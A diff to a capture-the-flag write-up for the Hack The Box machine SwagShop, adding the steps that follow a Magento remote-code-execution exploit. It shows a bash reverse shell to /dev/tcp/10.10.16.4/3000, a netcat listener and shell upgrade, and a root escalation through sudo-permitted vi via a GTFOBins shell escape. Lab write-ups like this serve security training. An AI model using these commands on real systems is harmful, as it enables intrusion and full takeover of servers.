@@ -164,7 +164,7 @@ def exploit(username, password, installDate, command, targetUrl):
 	print("[+] Starting mechanize browser")
 	print("[+] Proxy set to 127.0.0.1:8080")
 	br = mechanize.Browser()
-	br.set_proxies({"http": "127.0.0.1:8080"})
+	##br.set_proxies({"http": "127.0.0.1:8080"}) ## Uncomment this line if you want to proxy your traffic
 	br.set_handle_robots(False)
 	request = br.open(targetUrl)
 	br.select_form(nr=0)                                                                
@@ -202,5 +202,88 @@ if __name__ == '__main__':
 	exploit(args.u, args.p, args.d, args.c, args.l)
 ```
 ### Obtaining reverse shell
+
+Now, let's execute the python script to obtain a reverse shell
+
+```
+┌──(htb)─(kali㉿kali)-[~/Desktop]
+└─$ python3 rce.py -u 'forme' -p 'forme' -d 'Wed, 08 May 2019 07:23:09 +0000' -l 'http://swagshop.htb/index.php/admin/' -c '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.4/3000 0>&1"'
+[+] Setting up configurations...
+    - Username: forme
+    - Password: forme
+    - Install Date: Wed, 08 May 2019 07:23:09 +0000
+    - Command to execute: /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.4/3000 0>&1"
+    - Target URL: http://swagshop.htb/index.php/admin/
+[+] Generating POP chain payload
+[+] Starting mechanize browser
+[+] Proxy set to 127.0.0.1:8080
+[+] Successfully logged into admin interface
+[+] Dropping payload...
+```
+
+Next, all we have to do is to stabilize the reverse shell
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 3000 
+listening on [any] 3000 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.140] 43028
+bash: cannot set terminal process group (1269): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@swagshop:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<html$ python3 -c 'import pty; pty.spawn("/bin/bash")'                       
+www-data@swagshop:/var/www/html$ export TERM=xterm
+export TERM=xterm
+www-data@swagshop:/var/www/html$ stty cols 132 rows 34
+stty cols 132 rows 34
+www-data@swagshop:/var/www/html$ 
+```
 ### Obtaining user flag
+
+```
+www-data@swagshop:/var/www/html$ cat /home/haris/user.txt
+cat /home/haris/user.txt
+<Redacted user flag>
+www-data@swagshop:/var/www/html$ 
+```
+
+### Priviilege Escalation to root
+
+Executing ```sudo -l```, we realize that we are able to execute files in /var/www/html directory with sudo privileges
+
+```
+www-data@swagshop:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+```
+
+Using GTFO bins,  we can escalate our shell to a root shell
+
+```
+vi
+:set shell=/bin/sh
+:shell
+```
+
 ### Obtaining root flag
+```
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+<Redacted root flag>
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+```
